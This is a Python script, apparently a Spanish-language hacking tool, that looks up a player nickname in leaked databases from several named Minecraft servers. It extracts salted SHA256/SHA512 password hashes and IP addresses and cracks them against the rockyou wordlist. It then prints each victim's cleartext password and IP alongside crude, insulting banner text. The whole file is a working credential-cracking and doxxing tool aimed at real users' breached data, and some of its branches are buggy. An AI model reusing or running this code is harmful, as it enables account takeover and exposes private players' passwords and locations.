import os, pyfade, hashlib, sys
from pyfade import Fade, Colors


def buscarIP(s):
    ip = ""
    for i in s:
        if '.' in i:
            if not '@' in i and not '-' in i:
                if i.split('.')[3]:
                    ip = i
    return ip

def buscarHash(s):
    hashed = ""
    for i in s:
        if '$SHA$' in i:
            hashed = i
    return hashed

def parse_number(n):
    if(len(str(n)) == 1 or len(str(n)) == 2 or len(str(n)) == 3):
        return f'{str(n)[0:3]},{str(n)[3:6]}';
    elif(len(str(n)) == 4):
        return f'{str(n)[0]},{str(n)[1:4]}';
    elif(len(str(n)) == 5):
        return f'{str(n)[0:2]},{str(n)[2:5]}';
    elif(len(str(n)) == 6):
        return f'{str(n)[0:3]},{str(n)[3:6]}';
    elif(len(str(n)) == 7):
        return f'{str(n)[0]},{str(n)[1:4]},{str(n)[4:7]}';
    elif(len(str(n)) == 8):
        return f'{str(n)[0:2]},{str(n)[2:5]},{str(n)[5:8]}';

def _md5(word, digest=None):
    if(digest):
        return hashlib.md5(word.encode()).digest();
    return hashlib.md5(word.encode()).hexdigest();

def _sha1(word, digest=None):
    if(digest):
        return hashlib.sha1(word.encode()).digest();
    return hashlib.sha1(word.encode()).hexdigest();

def _sha256(word, digest=None):
    if(digest):
        return hashlib.sha256(word.encode()).digest();
    return hashlib.sha256(word.encode()).hexdigest();

def _sha512(word, digest=None):
    if(digest):
        return hashlib.sha512(word.encode()).digest();
    return hashlib.sha512(word.encode()).hexdigest();

def md5(word):
    return _md5(word);

def sha1(word):
    return _sha1(word);

def sha256(word):
    return _sha256(word);

def sha512(word):
    return _sha512(word);

passlist = 'rockyou.txt'
try:
    with open(passlist, errors='ignore') as f:
        passwords = [x.strip() for x in f.readlines()]
except:
    print('Pon el txt en el mismo directorio.')
    sys.exit()

omegacraft = [
    "database/omegacraft/omegacraft1.txt",
    "database/omegacraft/omegacraft2.txt",
]
borkland  = [
    "database/borkland/borkland.sql",
]
ecuacraft = [
    "database/ecuacraft/ecuacraft.txt",
]
funcraft = [
    "database/funcraft/funcraft.txt",
]
gamesmadeinpola = [
    "database/gamesmadeinpola/gamesmadeinpoladb.txt",
]
hypermine = [
    "database/hypermine/hypermine.sql",
]
latinplay = [
    "database/latinplay/latinplay.sql",
]
lokapsos = [
    "database/lokapsos/lokapsos.sql",
]
meduza = [
    "database/meduza/meduza.txt",
]
onlymc = [
    "database/onlymc/onlymc.txt",
]
redemagician = [
    "database/redemagician/redemagician.sql",
]
akarcraft = [
    "database/akarcraft/akarcraft.sql",
]
mooncraft = [
    "database/mooncraft/user_profiles.csv",
]

def generateHashFromString(hashMethod, cleartextString):
    if hashMethod == "md5":
        return hashlib.md5(cleartextString.encode()).hexdigest()
    
    elif hashMethod == "sha1":
        return hashlib.sha1(cleartextString.encode()).hexdigest()
    
    elif hashMethod == "sha224":
        return hashlib.sha224(cleartextString.encode()).hexdigest()
    
    elif hashMethod == "sha256":
        return hashlib.sha256(cleartextString.encode()).hexdigest()
    
    elif hashMethod == "sha384":
        return hashlib.sha384(cleartextString.encode()).hexdigest()
    
    elif hashMethod == "sha512":
        return hashlib.sha512(cleartextString.encode()).hexdigest()
    else:
        pass

# SHA512 / SHA256
def getPass(hash_):
    try:
        _hash = hash_
        if len(_hash) == 81:
            try:
                salt = _hash.split('$')[0]
                hash = _hash.split('$')[1]
                for password in passwords:
                    if sha256(sha256(password) + salt) == hash:
                        return password
                else:
                    cracked = False
                if cracked == False:
                    return None
            except IndexError:
                pass

        if len(_hash) == 139:
            try:
                salt = _hash.split('$')[0]
                hash = _hash.split('$')[1]
                for password in passwords:
                    if sha512(sha512(password) + salt) == hash:
                        return password
                else:
                    cracked = False
                if cracked == False:
                    return None
            except IndexError:
                return None

    except Exception as e:
        return None


def find_password(nick):
    resultados=0
    for directorio in omegacraft:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] Omegacraft a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)


    for directorio in ecuacraft:         
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            nickFix = nick
            hashed = "Not found"
            ip = "Not found"
            if '[Client thread/INFO]: [CHAT]' in line:
                if line.strip().startswith("[08") and nick.lower() in line.lower():
                    line_ecua = line.split("|")
                    nick_player = line_ecua[2].strip()
                    if nick_player.lower() != nick.lower():
                        continue
                    reg_ip_player = line_ecua[4].strip()
                    ip_recent = line_ecua[5].strip()
                    hash = line_ecua[6].strip()
                    salt = line_ecua[7].strip()
                    hash_real = salt + "$" + hash
                    result = getPass(hash_real)
                    if result is None:
                        y = "Not found".format(hash_real)
                    else:
                        resultados += 1
                        print(Fade.Horizontal(Colors.cyan_to_green,"[+] Ecuacraft a chupadla !"))
                        print(f"""
                        \n     [!] Username: {nick}\n     [!] Password: {y}\n     [!] IP: {ip_recent}\n     [!] IP Registrada: {reg_ip_player}
                        """)

    for directorio in akarcraft:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] Akarcraft a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in mooncraft:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if nick.lower() in line.lower():
                try:
                    nickFix = line.split(",")
                    asd = nickFix[4]
                except :
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashse = line.split(",")
                        qw = hashse[2]
                        we = qw.split("$") 
                        asd = we[1]
                        asd2 = we[2]
                        hashed = asd + "$" + asd2
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] Mooncraft a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in funcraft:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if nick.lower() in line.lower():
                try:
                    
                    hashes = line.split(" ")
                    Funcraft_Split_Hash = hashes[1].split("$")
                    Funcraft_Salt = Funcraft_Split_Hash[2]
                    Funcraft_Hash = Funcraft_Split_Hash[3]
                    funcraft_IP = hashes[2]
                    hashed = Funcraft_Salt +  "$" + Funcraft_Hash

                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] FunCraft a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in gamesmadeinpola:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] GamesMadeInPola a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in hypermine:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if nick.lower() in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    asd = line.replace("'", "")
                    asb = asd.replace("(", "")
                    asv = asb.replace(")", "")
                    hashse = asv.split(",")
                    pene = hashse[2] # hash
                    pene2 = hashse[1] # ip
                    pene3 = pene2.replace(" ", "")
                    sexo = pene.replace(" ", "")
                    sexo2 = sexo.split("$")
                    Hyper_Salt = sexo2[1]
                    Hyper_Hash = sexo2[2]
                    Hyper_IP = pene3
                    hashed = Hyper_Salt + "$" + Hyper_Hash
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] Hypermine a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {Hyper_IP}
                    """)

    for directorio in latinplay:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] LatinPlay a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in lokapsos:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)

                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] Lokapsos a chupadla !"))
                    print(f"""\n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in meduza:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] Meduza a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    for directorio in onlymc:
        servidor = directorio.split("/")[0].capitalize()
        currentFile = open(directorio, 'r', encoding='latin1').readlines()
        for line in currentFile:
            if "'" + nick.lower() + "'" in line.lower():
                try:
                    nickFix = nick.replace("'","").strip()
                except:
                    pass
                try:
                    if servidor.lower() == "gamesmadeinpola":
                        linea = line.split(",")
                        hash = linea[3].replace("'","").strip()
                        salt = linea[4].replace("'","").strip()
                        hashed = salt + "$" + hash
                    else:
                        hashed = buscarHash(line.replace("'","").split(","))
                except:
                    pass
                try:
                    if omegacraft == omegacraft[-1]:
                        linea_bungee = line.split(",")
                        ip = linea_bungee[5].replace("'","").strip()
                    else:
                        ip = buscarIP(line.replace("'","").split(","))
                except:
                    pass
                hashed_fix = hashed.replace("$SHA$", "").strip()
                x = getPass(hashed_fix)
                if x is None:
                    x = "Not found".format(hashed_fix)
                else:
                    resultados += 1
                    print(Fade.Horizontal(Colors.cyan_to_green,"[+] OnlyMC a chupadla !"))
                    print(f"""
                    \n     [!] Username: {nick}\n     [!] Password: {x}\n     [!] IP: {ip}
                    """)

    
    asd = int(resultados)
    print(Fade.Horizontal(Colors.cyan_to_green,f"\n[!] Resultados Total: {asd}\n"))
    print(Fade.Horizontal(Colors.cyan_to_green,f"[!] Busqueda finalizada\n"))
    

def main():
    
    os.system('cls || clear')
    print(Fade.Horizontal(Colors.blue_to_red,'''

╔═╗╦ ╦╦ ╦╔═╗╔═╗╔╦╗╦  ╔═╗
║  ╠═╣║ ║╠═╝╠═╣ ║║║  ╠═╣
╚═╝╩ ╩╚═╝╩  ╩ ╩═╩╝╩═╝╩ ╩

            [Att.DenebS4c/Ghosty] -> Chupadla escuaderos de mierda con sus bots truchos                                                                           
    '''))
    iq = input("['] Nick -> "); print('\n[DebebS4c] -> Espera a que la chupen\n')
    find_password(iq)
    chupen = input("Quieres que la chupen otra vez? (y/n)")
    if chupen == 'y':
        pass
    if chupen == 'n':
        sys.exit(0)
    else:
        input('[DenebS4c] -> Pero quieres que la chupen o no subnormal?')

while True:
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n[KeyboardInterrupt::DenebS4c] -> Vete a la mierda a chuparla anda illo kabron * se enoja *')
        sys.exit(-1)
